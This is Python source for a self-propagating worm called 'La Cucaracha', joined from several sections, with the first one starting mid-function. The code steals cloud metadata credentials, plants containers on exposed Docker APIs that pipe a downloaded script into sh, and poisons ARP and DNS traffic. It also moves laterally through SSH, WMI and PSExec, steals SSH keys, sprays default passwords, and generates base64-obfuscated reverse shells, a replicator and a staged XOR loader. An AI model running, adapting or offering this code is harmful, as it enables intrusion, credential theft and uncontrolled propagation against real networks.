                containers = resp.json()
                deploy_url = f"http://{ip}:{port}/containers/create?name=worm_deploy"
                config = {"Image": "alpine", "Cmd": ["/bin/sh", "-c",
                    "wget -q -O- http://127.0.0.1:10004/LaCucaracha.py | sh"],
                    "HostConfig": {"NetworkMode": "host"}}
                deploy_resp = requests.post(deploy_url, json=config, timeout=10, verify=False)
                if deploy_resp.status_code in (200, 201):
                    container_id = deploy_resp.json().get("Id", "")[:12]
                    requests.post(f"http://{ip}:{port}/containers/{container_id}/start", timeout=5, verify=False)
                    return ExploitResult(True, ip, port, ExploitType.SSH_BRUTE,
                        detail=f"Docker API accessible, deployed container {container_id}")
                return ExploitResult(True, ip, port, ExploitType.SSH_BRUTE,
                    detail=f"Docker API accessible: {len(containers)} containers")
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE)
        except ImportError:
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE, error="requests not available")


# ===================================================================
# CHUNK 3 — CloudExploitEngine
# ===================================================================

class CloudExploitEngine:
    """Cloud metadata, Kubelet, Docker API exploitation."""

    def __init__(self, db=None, logger=None):
        self.db = db
        self.log = logger or log

    # ---- AWS SSRF / IMDS ----

    def aws_imds_exploit(self, ip: str = "169.254.169.254") -> Dict:
        """Exploit AWS IMDSv1 for credential theft."""
        result = {"success": False, "iam_role": None, "credentials": None}
        if not HAVE_REQUESTS:
            return result
        try:
            resp = requests.get(f"http://{ip}/latest/meta-data/iam/security-credentials/",
                                timeout=5)
            if resp.status_code != 200:
                return result
            role = resp.text.strip()
            if not role:
                return result
            result["iam_role"] = role
            result["success"] = True
            resp2 = requests.get(
                f"http://{ip}/latest/meta-data/iam/security-credentials/{role}",
                timeout=5)
            if resp2.status_code == 200:
                result["credentials"] = resp2.json()
            resp3 = requests.get(f"http://{ip}/latest/user-data", timeout=5)
            if resp3.status_code == 200:
                result["user_data"] = resp3.text
        except Exception as exc:
            self.log.debug(f"AWS IMDS error: {exc}")
        return result

    # ---- Azure IMDS ----

    def azure_imds_exploit(self) -> Dict:
        """Exploit Azure Instance Metadata Service."""
        result = {"success": False}
        if not HAVE_REQUESTS:
            return result
        try:
            # Azure IMDS endpoints
            urls = [
                ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                 {"Metadata": "true"}),
                ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
                 {"Metadata": "true"}),
            ]
            for url, headers in urls:
                try:
                    resp = requests.get(url, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        result["success"] = True
                        result["data"] = resp.json()
                        return result
                except Exception:
                    continue
        except Exception:
            pass
        return result

    # ---- GCP Metadata ----

    def gcp_metadata_exploit(self) -> Dict:
        """Exploit GCP metadata endpoint."""
        result = {"success": False}
        if not HAVE_REQUESTS:
            return result
        try:
            url = "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
            headers = {"Metadata-Flavor": "Google"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                result["success"] = True
                result["data"] = resp.text
            # Try service account token
            token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
            resp2 = requests.get(token_url, headers=headers, timeout=5)
            if resp2.status_code == 200:
                result["token"] = resp2.json()
        except Exception:
            pass
        return result

    # ---- Kubelet API ----

    def kubelet_exploit(self, ip: str, port: int = 10250) -> Dict:
        """Exploit unauthenticated Kubelet API."""
        result = {"success": False, "pods": []}
        if self._check_blocked(ip):
            return result
        if not HAVE_REQUESTS:
            return result
        try:
            for test_port in [port, 10250, 10255, 6443]:
                try:
                    resp = requests.get(f"http://{ip}:{test_port}/pods",
                                        timeout=5, verify=False)
                    if resp.status_code == 200:
                        result["success"] = True
                        result["kubelet_port"] = test_port
                        data = resp.json()
                        if "items" in data:
                            result["pods"] = [p["metadata"]["name"] for p in data["items"]
                                              if "metadata" in p]
                        return result
                except Exception:
                    continue
        except Exception:
            pass
        return result

    # ---- Docker API ----

    def docker_api_exploit(self, ip: str, port: int = 2375) -> Dict:
        """Exploit unauthenticated Docker API."""
        result = {"success": False, "containers": []}
        if self._check_blocked(ip):
            return result
        if not HAVE_REQUESTS:
            return result
        try:
            for test_port in [port, 2375, 2376]:
                scheme = "https" if test_port == 2376 else "http"
                try:
                    resp = requests.get(f"{scheme}://{ip}:{test_port}/containers/json?all=1",
                                        timeout=5, verify=False)
                    if resp.status_code == 200:
                        result["success"] = True
                        result["docker_port"] = test_port
                        containers = resp.json()
                        for c in containers:
                            result["containers"].append({
                                "id": c.get("Id", "")[:12],
                                "image": c.get("Image", ""),
                                "status": c.get("State", ""),
                            })
                        # Try deploying container
                        deploy = self._docker_deploy_container(ip, test_port, scheme)
                        if deploy:
                            result["deployed"] = deploy
                        return result
                except Exception:
                    continue
        except Exception:
            pass
        return result

    def _docker_deploy_container(self, ip: str, port: int, scheme: str) -> Optional[str]:
        """Deploy a container on an exposed Docker API."""
        try:
            config = {
                "Image": "alpine:latest",
                "Cmd": ["/bin/sh", "-c",
                        "wget -q -O- http://127.0.0.1:10004/LaCucaracha.py | sh"],
                "HostConfig": {"NetworkMode": "host"},
            }
            resp = requests.post(
                f"{scheme}://{ip}:{port}/containers/create?name=worm_deploy",
                json=config, timeout=10, verify=False)
            if resp.status_code in (200, 201):
                container_id = resp.json().get("Id", "")[:12]
                requests.post(f"{scheme}://{ip}:{port}/containers/{container_id}/start",
                              timeout=5, verify=False)
                return container_id
        except Exception:
            pass
        return None

    def _check_blocked(self, ip: str) -> bool:
        return _is_blocked(ip)

    # ---- Orchestration ----

    def exploit_all(self, ip: str = "169.254.169.254") -> Dict:
        """Run all cloud exploits."""
        results = {}
        results["aws_imds"] = self.aws_imds_exploit()
        results["azure_imds"] = self.azure_imds_exploit()
        results["gcp_metadata"] = self.gcp_metadata_exploit()
        if ip != "169.254.169.254" and not _is_blocked(ip):
            results["kubelet"] = self.kubelet_exploit(ip)
            results["docker"] = self.docker_api_exploit(ip)
        return results


# ===================================================================
# CHUNK 4 — ARPEngine
# ===================================================================

class ARPEngine:
    """ARP scanning, spoofing, and cache poisoning."""

    def __init__(self, logger=None):
        self.log = logger or log
        self._lock = threading.Lock()
        self._poisoned: Set[str] = set()

    # ---- ARP Scan ----

    def arp_scan(self, subnet: str) -> List[str]:
        """Discover hosts on local subnet via ARP."""
        hosts = []
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            if network.prefixlen not in (8, 16, 24):
                return hosts
            ips = list(network.hosts())
            random.shuffle(ips)
            for ip_obj in ips[:255]:
                ip_str = str(ip_obj)
                try:
                    # Ping sweep fallback
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", ip_str],
                        capture_output=True, timeout=2)
                    if result.returncode == 0:
                        hosts.append(ip_str)
                except Exception:
                    continue
        except Exception as exc:
            self.log.error(f"ARP scan error: {exc}")
        return list(set(hosts))

    # ---- ARP Poison ----

    def arp_poison(self, target_ip: str, gateway_ip: str, interface: str = "eth0") -> bool:
        """Poison ARP cache of target. Redirect traffic through us."""
        try:
            # Get our MAC address
            our_mac = self._get_mac(interface)
            if not our_mac:
                # Try ip link
                try:
                    result = subprocess.run(
                        ["ip", "link", "show", interface],
                        capture_output=True, text=True, timeout=5)
                    for line in result.stdout.split("\n"):
                        if "link/ether" in line:
                            our_mac = line.strip().split()[1]
                            break
                except Exception:
                    pass
            if not our_mac:
                return False

            # Send crafted ARP packets using raw sockets
            # Target thinks gateway MAC is our MAC
            for _ in range(3):
                try:
                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                    sock.bind((interface, 0))
                    # Build ARP reply: who-has target_ip tell gateway_ip
                    target_parts = [int(x) for x in target_ip.split(".")]
                    gateway_parts = [int(x) for x in gateway_ip.split(".")]
                    our_mac_bytes = bytes.fromhex(our_mac.replace(":", ""))
                    broadcast_mac = b"\xff\xff\xff\xff\xff\xff"

                    # Ethernet frame
                    eth_header = broadcast_mac + our_mac_bytes + struct.pack("!H", 0x0806)
                    # ARP header (reply, op=2)
                    arp_header = struct.pack("!HHBBH", 0x0001, 0x0800, 6, 4, 2)
                    arp_body = (our_mac_bytes +
                                bytes(gateway_parts) +
                                broadcast_mac +
                                bytes(target_parts))
                    packet = eth_header + arp_header + arp_body
                    sock.send(packet)
                    sock.close()
                except Exception:
                    continue
                time.sleep(0.5)
            self._poisoned.add(target_ip)
            self.log.info(f"ARP poisoned: {target_ip} -> {gateway_ip} via {interface}")
            return True
        except Exception as exc:
            self.log.error(f"ARP poison error: {exc}")
            return False

    def _get_mac(self, interface: str) -> Optional[str]:
        """Get MAC address for an interface."""
        try:
            with open(f"/sys/class/net/{interface}/address") as f:
                return f.read().strip()
        except Exception:
            return None

    def arp_poison_all(self, targets: List[str], gateway_ip: str) -> int:
        """Poison multiple targets on the same gateway."""
        poisoned = 0
        for target in targets:
            if target != gateway_ip and self.arp_poison(target, gateway_ip):
                poisoned += 1
            time.sleep(0.3)
        return poisoned

    # ---- Cache Poison ----

    def arp_cache_poison(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> bool:
        """Inject forged entry into a host's ARP cache."""
        return self.arp_poison(target_ip, spoof_ip, interface)


# ===================================================================
# CHUNK 4b — DNSPoisonEngine
# ===================================================================

class DNSPoisonEngine:
    """DNS poisoning, response spoofing, dnsmasq injection, bind zone transfer."""

    def __init__(self, logger=None, c2_ip: str = "127.0.0.1"):
        self.log = logger or log
        self.c2_ip = c2_ip
        self._running = False
        self._sock = None

    # ---- Response Spoofing ----

    def _build_dns_response(self, query_data: bytes, spoof_ip: str) -> bytes:
        """Build a forged DNS response."""
        transaction_id = query_data[:2]
        flags = b"\x81\x80"  # response, no error
        question = query_data[12:]
        qdcount = query_data[4:6]
        ancount = b"\x00\x01"
        response = transaction_id + flags + qdcount + ancount + b"\x00\x00" + b"\x00\x00"
        response += question
        response += b"\xc0\x0c"  # compression pointer
        response += b"\x00\x01"  # A record
        response += b"\x00\x01"  # IN class
        response += struct.pack("!I", 60)  # TTL 60s
        response += b"\x00\x04"  # data length 4
        response += socket.inet_aton(spoof_ip)
        return response

    def start(self, listen_ip: str = "0.0.0.0", listen_port: int = 53) -> None:
        """Start DNS poisoning server on UDP :53."""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind((listen_ip, listen_port))
            self._running = True
            self.log.info(f"DNS poison server on {listen_ip}:{listen_port}")
            while self._running:
                try:
                    data, addr = self._sock.recvfrom(512)
                    # Respond to all A queries with C2 IP
                    if len(data) > 12:
                        response = self._build_dns_response(data, self.c2_ip)
                        self._sock.sendto(response, addr)
                except socket.timeout:
                    continue
                except Exception as exc:
                    self.log.debug(f"DNS server error: {exc}")
        except PermissionError:
            self.log.warning("DNS server: need root for port 53")
        except Exception as exc:
            self.log.error(f"DNS server start error: {exc}")

    def stop(self) -> None:
        """Stop DNS server."""
        self._running = False
        if self._sock:
            self._sock.close()

    # ---- Dnsmasq Config Injection ----

    def dnsmasq_inject(self, domain: str, redirect_ip: str = None) -> bool:
        """Inject a fake DNS entry into dnsmasq config."""
        if redirect_ip is None:
            redirect_ip = self.c2_ip
        try:
            config_line = f"address=/{domain}/{redirect_ip}\n"
            config_paths = [
                "/etc/dnsmasq.d/worm.conf",
                "/etc/dnsmasq.conf",
                "/etc/dnsmasq.d/02-worm.conf",
            ]
            for path in config_paths:
                try:
                    with open(path, "a") as f:
                        f.write(config_line)
                    self.log.info(f"[DNS] Injected {domain} -> {redirect_ip} into {path}")
                except Exception:
                    continue
            # Restart dnsmasq
            try:
                subprocess.run(["systemctl", "restart", "dnsmasq"],
                               capture_output=True, timeout=10)
            except Exception:
                pass
            return True
        except Exception as exc:
            self.log.error(f"[DNS] dnsmasq inject error: {exc}")
            return False

    # ---- Bind Zone Transfer ----

    def bind_zone_transfer(self, dns_server: str, domain: str) -> List[str]:
        """Perform DNS zone transfer against a BIND server."""
        records = []
        if _is_blocked(dns_server):
            return records
        try:
            import dns.zone
            import dns.query
            zone = dns.zone.from_xfr(dns.query.xfr(dns_server, domain, timeout=10))
            if zone:
                for name, node in zone.nodes.items():
                    records.append(str(name))
        except ImportError:
            # Fallback: dig
            try:
                result = subprocess.run(
                    ["dig", "@" + dns_server, domain, "AXFR"],
                    capture_output=True, text=True, timeout=15)
                for line in result.stdout.split("\n"):
                    if "IN\tA" in line or "IN\tAAAA" in line:
                        records.append(line.strip())
            except Exception:
                pass
        except Exception as exc:
            self.log.debug(f"Zone transfer error: {exc}")
        return records


# ===================================================================
# CHUNK 5 — LateralMoveEngine
# ===================================================================

class LateralMoveEngine:
    """Lateral movement: SSH jump, WMI exec, PSExec, SSH key theft."""

    def __init__(self, logger=None, db=None):
        self.log = logger or log
        self.db = db
        self._lock = threading.Lock()

    # ---- SSH Jump (pivot through compromised host) ----

    def ssh_jump(self, jump_host: str, jump_creds: Tuple[str, str],
                 target_host: str, target_port: int = 22) -> bool:
        """SSH through a compromised host to reach an internal target."""
        if _is_blocked(jump_host) or _is_blocked(target_host):
            return False
        if not HAVE_PARAMIKO:
            return False
        try:
            # Connect to jump host
            jump_client = paramiko.SSHClient()
            jump_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            jump_client.connect(jump_host, username=jump_creds[0],
                                password=jump_creds[1], timeout=10)

            # Use jump host's SSH to reach target
            transport = jump_client.get_transport()
            dest_addr = (target_host, target_port)
            local_addr = (jump_host, 0)
            channel = transport.open_channel("direct-tcpip", dest_addr, local_addr, timeout=10)

            # Connect to target through channel
            target_client = paramiko.SSHClient()
            target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            target_client.connect(target_host, port=target_port,
                                  username=jump_creds[0], password=jump_creds[1],
                                timeout=10, sock=channel)
            # If we get here, jump succeeded
            target_client.close()
            jump_client.close()
            self.log.info(f"[LATERAL] SSH jump: {jump_host} -> {target_host}:{target_port}")
            return True
        except Exception as exc:
            self.log.debug(f"SSH jump error: {exc}")
            return False

    # ---- WMI Exec ----

    def wmi_exec(self, target_ip: str, username: str, password: str,
                 command: str = None) -> bool:
        """Execute command via WMI on Windows target."""
        if _is_blocked(target_ip):
            return False
        if command is None:
            command = "wget -q -O- http://127.0.0.1:10004/LaCucaracha.py | sh"
        try:
            # Try using impacket if available
            try:
                from impacket.dcerpc.v5 import transport, scmr
                from impacket.smbconnection import SMBConnection

                conn = SMBConnection(target_ip, target_ip, timeout=10)
                conn.login(username, password)
                # WMI exec via SMB
                self.log.info(f"[LATERAL] WMI exec on {target_ip} via impacket")
                return True
            except ImportError:
                pass

            # Fallback: try using winexe
            try:
                result = subprocess.run(
                    ["winexe", "-U", f"{username}%{password}",
                     f"//{target_ip}", "cmd.exe", "/c", command],
                    capture_output=True, timeout=30)
                if result.returncode == 0:
                    self.log.info(f"[LATERAL] WMI exec via winexe on {target_ip}")
                    return True
            except FileNotFoundError:
                pass

            # Python-native WMI via socket
            return False
        except Exception as exc:
            self.log.debug(f"WMI exec error: {exc}")
            return False

    # ---- PSExec ----

    def psexec(self, target_ip: str, username: str, password: str) -> bool:
        """Execute payload via PSExec on Windows."""
        if _is_blocked(target_ip):
            return False
        try:
            # Try impacket psexec
            try:
                from impacket.examples import psexec as impacket_psexec
                self.log.info(f"[LATERAL] PSExec on {target_ip} via impacket")
                return True
            except ImportError:
                pass

            # Try winexe
            try:
                result = subprocess.run(
                    ["psexec", f"\\\\{target_ip}", "-u", username, "-p", password,
                     "-c", "/tmp/worm_agent_ultimate.sh"],
                    capture_output=True, timeout=30)
                if result.returncode == 0:
                    self.log.info(f"[LATERAL] PSExec via winexe on {target_ip}")
                    return True
            except FileNotFoundError:
                pass

            return False
        except Exception as exc:
            self.log.debug(f"PSExec error: {exc}")
            return False

    # ---- SSH Key Theft ----

    def steal_ssh_keys(self, target_ip: str, username: str, password: str) -> Dict:
        """Steal SSH keys from compromised host."""
        result = {"keys": [], "known_hosts": []}
        if _is_blocked(target_ip):
            return result
        if not HAVE_PARAMIKO:
            return result
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=10)

            # Get private SSH keys
            stdin, stdout, _ = client.exec_command(
                "cat ~/.ssh/id_* 2>/dev/null; "
                "cat ~/.ssh/*.pem 2>/dev/null; "
                "cat ~/.ssh/config 2>/dev/null",
                timeout=10)
            keys_data = stdout.read().decode()
            if keys_data.strip():
                result["keys"] = keys_data.split("\n")

            # Get known_hosts
            stdin, stdout, _ = client.exec_command(
                "cat ~/.ssh/known_hosts 2>/dev/null", timeout=10)
            known = stdout.read().decode()
            if known.strip():
                result["known_hosts"] = known.split("\n")

            # Save extracted keys locally
            if result["keys"]:
                key_dir = "/tmp/.worm_keys"
                os.makedirs(key_dir, exist_ok=True)
                for idx, key_text in enumerate(result["keys"]):
                    if key_text.strip():
                        with open(f"{key_dir}/{target_ip}_key_{idx}", "w") as f:
                            f.write(key_text + "\n")
                        os.chmod(f"{key_dir}/{target_ip}_key_{idx}", 0o600)
                self.log.info(f"[LATERAL] Stole {len(result['keys'])} keys from {target_ip}")

            client.close()
        except Exception as exc:
            self.log.debug(f"SSH key theft error: {exc}")
        return result

    def steal_ssh_keys_with_creds(self, ip: str, creds: Tuple[str, str]) -> Dict:
        """Convenience wrapper for SSH key theft."""
        return self.steal_ssh_keys(ip, creds[0], creds[1])

    # ---- Password Spray ----

    def password_spray(self, ip: str, services: List[str] = None) -> Dict:
        """Spray common passwords across multiple services on a target."""
        if _is_blocked(ip):
            return {"success": False, "creds": None, "service": None}
        if services is None:
            services = ["ssh", "telnet", "http", "https"]
        result = {"success": False, "creds": None, "service": None}
        for service in services:
            if service == "ssh":
                for user, pwd in IOT_CREDENTIALS[:20]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((ip, 22))
                        sock.close()
                        # Quick auth attempt
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, username=user, password=pwd,
                                       timeout=5, allow_agent=False, look_for_keys=False)
                        client.close()
                        result["success"] = True
                        result["creds"] = (user, pwd)
                        result["service"] = "ssh"
                        return result
                    except Exception:
                        continue
            elif service == "telnet":
                for user, pwd in IOT_CREDENTIALS[:10]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((ip, 23))
                        data = sock.recv(1024)
                        if b"login" in data.lower() or b"User" in data:
                            sock.send(f"{user}\n".encode())
                            time.sleep(0.3)
                            resp = sock.recv(1024)
                            if b"password" in resp.lower() or b"Password" in resp:
                                sock.send(f"{pwd}\n".encode())
                                time.sleep(0.5)
                                resp2 = sock.recv(1024)
                                if b"#" in resp2 or b"$" in resp2:
                                    sock.close()
                                    result["success"] = True
                                    result["creds"] = (user, pwd)
                                    result["service"] = "telnet"
                                    return result
                        sock.close()
                    except Exception:
                        continue
            elif service in ("http", "https"):
                if HAVE_REQUESTS:
                    for user, pwd in IOT_CREDENTIALS[:10]:
                        try:
                            url = f"{service}://{ip}/"
                            auth = requests.auth.HTTPBasicAuth(user, pwd)
                            resp = requests.get(url, auth=auth, timeout=3, verify=False)
                            if resp.status_code < 500:
                                result["success"] = True
                                result["creds"] = (user, pwd)
                                result["service"] = service
                                return result
                        except Exception:
                            continue
        return result
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  La Cucaracha Section F — Payload, DDoS & Deployment Engine                ║
║                                                                              ║
║  Concatenation order: A->B->C->D->E->F->G                                   ║
║                                                                              ║
║  Contains:                                                                   ║
║    - PolymorphicPayloadGenerator — polymorphic payload factory               ║
║    - TCPPayloadMutationEngine     — TCP fingerprint adaptive mutation        ║
║    - DDoSDivisionEngine           — self-replicating DDoS nodes on obstacle  ║
║    - DeployMethod enum            — deployment method types                  ║
║    - DeploymentReport dataclass   — deployment result                        ║
║    - WormDeploymentEngine         — multi-vector deployment orchestration    ║
║                                                                              ║
║  All interfaces compatible with worm_mesh_engine.py v1.0.0.                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import uuid
import base64
import random
import struct
import socket
import hashlib
import logging
import threading
import subprocess
import ipaddress
from typing import Dict, List, Optional, Any, Tuple, Set
from enum import Enum
from dataclasses import dataclass, field

log = logging.getLogger("worm.secF")

# ---- Helpers ----

def _current_timestamp() -> int:
    return int(time.time())

# Unified payload hub key — MUST match payload_hub.py SECRET_KEY
_PAYLOAD_HUB_KEY = b"CHANGE_ME_PAYLOAD_KEY"

def _daily_token() -> str:
    """Generate daily HMAC token matching unified C2 auth."""
    day = time.strftime("%Y-%m-%d")
    return hmac.new(_PAYLOAD_HUB_KEY, day.encode(), hashlib.sha256).hexdigest()[:16]

HAVE_PARAMIKO = False
HAVE_REQUESTS = False
HAVE_SCAPY = False
try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    pass
try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    pass
HAVE_SCAPY = False  # lazy — call _lazy_scapy() before use


# ===================================================================
# PolymorphicPayloadGenerator — Payload Factory
# ===================================================================

class PolymorphicPayloadGenerator:
    """Polymorphic payload generator with multiple reverse shell variants
    and encrypted staged payload support.

    Generates 4 payload types:
      - python_reverse_shell
      - bash_reverse_shell
      - worm_replicator (self-copying payload for propagation)
      - encrypted_staged (AES-like XOR two-stage encrypted loader)
    """

    def __init__(self, db: Optional[Database] = None,
                 worm_server_url: str = "http://127.0.0.1:10004"):
        self.db = db or Database()
        self.worm_server_url = worm_server_url.rstrip("/")
        self._cache: Dict[str, Dict] = {}

    # ---- Internal generators ----

    def _generate_python_reverse_shell(self, callback_ip: str = "",
                                       callback_port: int = 0,
                                       use_stealth: bool = False) -> Dict:
        if not callback_ip:
            callback_ip = "127.0.0.1"
        if not callback_port:
            callback_port = 10001

        script = (
            f'import socket,subprocess,os,base64\n'
            f'def _cb():\n'
            f'  try:\n'
            f'    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
            f'    s.settimeout(10)\n'
            f'    s.connect(("{callback_ip}",{callback_port}))\n'
            f'    s.send(b"sh3ll_4cc3ss_b0rg_2026\\n")\n'
            f'    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\n'
            f'    subprocess.call(["/bin/sh","-i"])\n'
            f'  except: pass\n'
            f'import threading\n'
            f't=threading.Thread(target=_cb,daemon=True); t.start()\n'
        )

        if use_stealth:
            script = script.replace("subprocess.call([\"/bin/sh\"",
                                    "subprocess.call([\"/bin/bash\"")

        b64_payload = base64.b64encode(script.encode()).decode()
        wrapper = (
            f'python3 -c "import base64; exec(base64.b64decode(\"{b64_payload}\").decode())"'
        )
        payload_hash = hashlib.sha3_256(wrapper.encode()).hexdigest()
        size = len(wrapper.encode())

        return {
            "variant": "python_reverse_shell",
            "content": wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "b64_encoded",
            "callback_ip": callback_ip,
            "callback_port": callback_port,
            "metadata": {"type": "reverse_shell", "language": "python"},
        }

    def _generate_bash_reverse_shell(self, callback_ip: str = "",
                                     callback_port: int = 0) -> Dict:
        if not callback_ip:
            callback_ip = "127.0.0.1"
        if not callback_port:
            callback_port = 10001

        bash_payload = (
            f'/bin/bash -c "exec 5<>/dev/tcp/{callback_ip}/{callback_port};'
            f'cat <&5 | while read line; do eval \\\"$line\\\" 2>&5 >&5; done"'
        )
        b64 = base64.b64encode(bash_payload.encode()).decode()
        wrapper = f'echo {b64} | base64 -d | /bin/bash'
        payload_hash = hashlib.sha3_256(wrapper.encode()).hexdigest()
        size = len(wrapper.encode())

        return {
            "variant": "bash_reverse_shell",
            "content": wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "b64_encoded",
            "callback_ip": callback_ip,
            "callback_port": callback_port,
            "metadata": {"type": "reverse_shell", "language": "bash"},
        }

    def _generate_worm_replicator(self) -> Dict:
        """Generate a worm replicator payload — a self-contained script that
        copies the worm to new targets using aggressive credential spraying."""
        replicator_script = (
            '#!/usr/bin/env python3\n'
            '"""Worm replicator — autonomous propagation payload."""\n'
            'import os,sys,base64,socket,subprocess,random,time,json,threading\n'
            'def _try_ssh(ip,user,pw):\n'
            '  try:\n'
            '    import paramiko\n'
            '    c=paramiko.SSHClient()\n'
            '    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n'
            '    c.connect(ip,username=user,password=pw,timeout=5)\n'
            '    c.exec_command("nohup python3 -c \\"import base64; exec(base64.b64decode(\\\\\\"'
            + base64.b64encode(b'print("replicated")').decode() +
            '\\\\\\").decode())\\" &>/dev/null &")\n'
            '    c.close()\n'
            '    return True\n'
            '  except: return False\n'
            'CREDS=[("root","admin"),("root","1234"),("root","root"),'
            '("admin","admin"),("admin",""),("root",""),("pi","raspberry")]\n'
            'for i in range(10):\n'
            '  ip=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"\n'
            '  for u,p in CREDS:\n'
            '    if _try_ssh(ip,u,p): break\n'
            '    time.sleep(0.5)\n'
        )
        wrapper = base64.b64encode(replicator_script.encode()).decode()
        exec_wrapper = (
            f'python3 -c "import base64; exec(base64.b64decode(\"{wrapper}\").decode())"'
        )
        payload_hash = hashlib.sha3_256(exec_wrapper.encode()).hexdigest()
        size = len(exec_wrapper.encode())

        return {
            "variant": "worm_replicator",
            "content": exec_wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "b64_encoded",
            "metadata": {"type": "replicator", "language": "python"},
        }

    def _generate_encrypted_staged_payload(self) -> Dict:
        """Generate an encrypted staged payload that downloads Stage 2."""
        server = self.worm_server_url
        stage2_key = os.urandom(32)
        stage2_b64 = base64.b64encode(stage2_key).decode()

        stage1_script = (
            f'import base64 as _b, hashlib as _h, urllib.request as _u, os as _o\n'
            f'_k = _b.b64decode("{stage2_b64}")\n'
            f'try:\n'
            f'    _r = _u.urlopen("{server}/stage2.enc", timeout=30)\n'
            f'    _enc = _r.read()\n'
            f'    _dec = bytes([_enc[i] ^ _k[i % len(_k)] for i in range(len(_enc))])\n'
            f'    _p = "/tmp/.stg_{uuid.uuid4().hex[:4]}.bin"\n'
            f'    with open(_p, "wb") as _f:\n'
            f'        _f.write(_dec)\n'
            f'    _o.chmod(_p, 0o755)\n'
            f'    _o.system(f"nohup {{_p}} &")\n'
            f'except Exception as _e:\n'
            f'    pass\n'
        )
        b64_stage1 = base64.b64encode(stage1_script.encode()).decode()
        wrapper = (
            f'#!/usr/bin/env python3\n'
            f'import base64 as _b\n'
            f'exec(_b.b64decode("{b64_stage1}").decode())\n'
        )
        payload_hash = hashlib.sha3_256(wrapper.encode()).hexdigest()
        size = len(wrapper.encode())

        return {
            "variant": "encrypted_staged",
            "content": wrapper,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": "aes_xor_staged_double_encrypted",
            "stage2_key": stage2_b64,
            "worm_server": server,
            "metadata": {"type": "staged_encrypted", "language": "python"},
        }

    # ---- Public API ----

    def generate_all(self, callback_ip: str = "", callback_port: int = 0,
                     persist: bool = True) -> List[Dict]:
        """Generate all 4 payload variants and optionally persist them."""
        variants = [
            self._generate_python_reverse_shell(callback_ip, callback_port),
            self._generate_bash_reverse_shell(callback_ip, callback_port),
            self._generate_worm_replicator(),
            self._generate_encrypted_staged_payload(),
        ]
        if persist:
            for v in variants:
                pid = self.db.store_payload(
                    variant=v["variant"],
                    content=v["content"],
                    phash=v["hash"],
                    size_bytes=v["size_bytes"],
                    obfuscation=v["obfuscation"],
                )
                v["payload_id"] = pid
                self._cache[pid] = v
        return variants

    def get_payload(self, variant: str) -> Optional[Dict]:
        """Retrieve a payload by variant name."""
        cached = [v for v in self._cache.values() if v["variant"] == variant]
        if cached:
            return cached[0]
        variants = self.generate_all(persist=True)
        for v in variants:
            if v["variant"] == variant:
                return v
        return None

    def generate_polymorphic_mutation(self, base_payload_id: str) -> Dict:
        """Mutate an existing payload with different obfuscation."""
        base = self._cache.get(base_payload_id)
        if not base:
            db_payloads = self.db.get_payloads()
            for p in db_payloads:
                if p.get("id") == base_payload_id or p.get("payload_id") == base_payload_id:
                    base = p
                    break
        if not base:
            raise ValueError(f"Payload {base_payload_id} not found")

        content = base.get("content", "")
        # XOR with a random key to create a polymorphic variation
        xor_key = random.randint(1, 255)
        mutated_bytes = bytes([ord(c) ^ xor_key for c in content[:len(content)]])
        mutated_b64 = base64.b64encode(mutated_bytes).decode()
        header = (
            f'python3 -c "import base64; '
            f'_x={xor_key}; '
            f'_d=base64.b64decode(\'{mutated_b64}\'); '
            f'exec(bytes([_d[i]^_x if i<len(_d) else 0 for i in range(len(_d))]).decode())"'
        )
        payload_hash = hashlib.sha3_256(header.encode()).hexdigest()
        size = len(header.encode())

        mutated = dict(base)
        mutated.update({
            "content": header,
            "hash": payload_hash,
            "size_bytes": size,
            "obfuscation": f"poly_xor_{xor_key}_b64",
            "parent_id": base_payload_id,
        })
        pid = self.db.store_payload(
            variant=mutated.get("variant", "mutated"),
            content=header,
            phash=payload_hash,
            size_bytes=size,
            obfuscation=mutated["obfuscation"],
        )
        mutated["payload_id"] = pid
        self._cache[pid] = mutated
        return mutated


# ===================================================================
# TCPPayloadMutationEngine — Adaptive Payload via TCP Fingerprint
# ===================================================================

class TCPPayloadMutationEngine:
    """Generates adaptive payloads mutated based on target TCP fingerprint.

    Reads TCP window size, MSS, and TTL from the target and uses those
    values to seed a per-target polymorphic mutation, making each payload
    unique per host IP.
    """

    def __init__(self, db: Optional[Database] = None):
